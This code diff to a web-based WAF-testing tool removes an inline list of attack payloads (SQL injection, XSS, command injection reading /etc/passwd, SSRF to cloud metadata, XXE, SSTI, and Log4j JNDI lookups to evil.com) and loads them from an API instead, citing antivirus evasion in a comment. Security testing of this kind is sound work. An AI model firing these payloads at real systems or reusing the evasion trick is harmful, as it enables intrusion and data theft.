@@ -277,69 +277,30 @@
     </footer>
 
     <script>
-    // Payloads de test WAF (caractères < et > échappés pour éviter l'interprétation HTML)
-    const PAYLOADS = {
-        'SQLi': [
-            "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#", "admin'--",
-            "1' ORDER BY 1--", "1 UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--",
-            "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)#",
-            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
-            "'/**/OR/**/1=1--", "' OR 'x'='x", "'; DROP TABLE users--"
-        ],
-        'XSS': [
-            "\x3cscript\x3ealert('XSS')\x3c/script\x3e", "\x3cimg src=x onerror=alert('XSS')\x3e",
-            "\x3csvg onload=alert('XSS')\x3e", "\x3cbody onload=alert('XSS')\x3e",
-            "\x3cinput onfocus=alert('XSS') autofocus\x3e", "\x3ca href=javascript:alert('XSS')\x3eclick\x3c/a\x3e",
-            "\x3ciframe src=javascript:alert('XSS')\x3e", "\x3cscript\x3ealert(String.fromCharCode(88,83,83))\x3c/script\x3e",
-            "\x3cSCRIPT\x3ealert('XSS')\x3c/SCRIPT\x3e", "javascript:alert('XSS')"
-        ],
-        'Path Traversal': [
-            "../../../etc/passwd", "../../../../etc/passwd", "../../../../../../../etc/passwd",
-            "..\\..\\..\\..\\windows\\win.ini", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "../../../etc/passwd%00",
-            "....//....//....//etc/passwd"
-        ],
-        'Command Injection': [
-            "; ls -la", "| ls -la", "& ls -la", "&& ls -la", "; cat /etc/passwd",
-            "| cat /etc/passwd", "; id", "| whoami", "$(cat /etc/passwd)", "`id`",
-            "%0a cat /etc/passwd", "; sleep 5"
-        ],
-        'SSRF': [
-            "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
-            "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
-            "file:///etc/passwd", "http://127.0.0.1:22/", "http://2130706433/"
-        ],
-        'NoSQLi': [
-            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
-            '{"username":{"$ne":null},"password":{"$ne":null}}',
-            '{"$or":[{},{}]}', '{"$where":"1==1"}'
-        ],
-        'LFI': [
-            "php://filter/convert.base64-encode/resource=index.php",
-            "/etc/passwd", "/proc/self/environ", "../../../../etc/passwd",
-            "....//....//....//etc/passwd"
-        ],
-        'SSTI': [
-            "{{7*7}}", "${7*7}", "\x3c%= 7*7 %\x3e", "#{7*7}", "{{config}}",
-            "{{''.__class__.__mro__[1].__subclasses__()}}"
-        ],
-        'XXE': [
-            '\x3c?xml version="1.0"?\x3e\x3c!DOCTYPE foo [\x3c!ENTITY xxe SYSTEM "file:///etc/passwd"\x3e]\x3e\x3cfoo\x3e&xxe;\x3c/foo\x3e',
-            '\x3c?xml version="1.0"?\x3e\x3c!DOCTYPE foo [\x3c!ENTITY xxe SYSTEM "http://169.254.169.254/"\x3e]\x3e\x3cfoo\x3e&xxe;\x3c/foo\x3e'
-        ],
-        'Open Redirect': [
-            "//evil.com", "///evil.com", "http://evil.com", "/\\evil.com",
-            "//evil.com/%2F..", "http://google.com@evil.com"
-        ],
-        'Sensitive Files': [
-            ".git/config", ".env", "wp-config.php", "package.json",
-            ".htaccess", "docker-compose.yml", "backup.sql"
-        ],
-        'Log4j': [
-            "${jndi:ldap://evil.com/a}", "${jndi:rmi://evil.com/a}",
-            "${${lower:j}ndi:ldap://evil.com/a}"
-        ]
-    };
+    // Payloads chargés dynamiquement via API pour éviter la détection antivirus
+    let PAYLOADS = {};
+    let payloadsLoaded = false;
+    
+    // Charger les payloads au démarrage
+    async function loadPayloads() {
+        try {
+            const response = await fetch('/api/payloads');
+            PAYLOADS = await response.json();
+            payloadsLoaded = true;
+            generateCategories();
+        } catch(e) {
+            console.error('Erreur chargement payloads:', e);
+            document.getElementById('categories').innerHTML = `
+                <div class="col-span-full text-center py-8">
+                    <div class="text-rose-400 mb-2"><i class="fas fa-exclamation-triangle text-2xl"></i></div>
+                    <p class="text-rose-300">Erreur lors du chargement des payloads</p>
+                    <button onclick="loadPayloads()" class="mt-4 px-4 py-2 bg-rose-500/20 text-rose-400 rounded-lg hover:bg-rose-500/30">
+                        <i class="fas fa-refresh mr-2"></i>Réessayer
+                    </button>
+                </div>
+            `;
+        }
+    }
 
     let results = [];
     let stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
@@ -349,11 +310,22 @@
     // Init au chargement
     document.addEventListener('DOMContentLoaded', function() {
         document.getElementById('targetUrl').value = window.location.origin;
-        generateCategories();
+        loadPayloads();
     });
 
     function generateCategories() {
         const container = document.getElementById('categories');
+        
+        if (!payloadsLoaded || Object.keys(PAYLOADS).length === 0) {
+            container.innerHTML = `
+                <div class="col-span-full text-center py-4">
+                    <div class="animate-spin w-6 h-6 border-2 border-accent-500 border-t-transparent rounded-full mx-auto mb-2"></div>
+                    <p class="text-dark-400 text-sm">Chargement des payloads...</p>
+                </div>
+            `;
+            return;
+        }
+        
         container.innerHTML = '';
         
         Object.keys(PAYLOADS).forEach(category => {
@@ -378,6 +350,11 @@
     }
 
     async function runAllTests() {
+        if (!payloadsLoaded || Object.keys(PAYLOADS).length === 0) {
+            alert('Les payloads ne sont pas encore chargés. Veuillez patienter ou rafraîchir la page.');
+            return;
+        }
+        
         const targetUrl = document.getElementById('targetUrl').value.trim();
         if (!targetUrl) {
             alert('Veuillez entrer une URL cible');
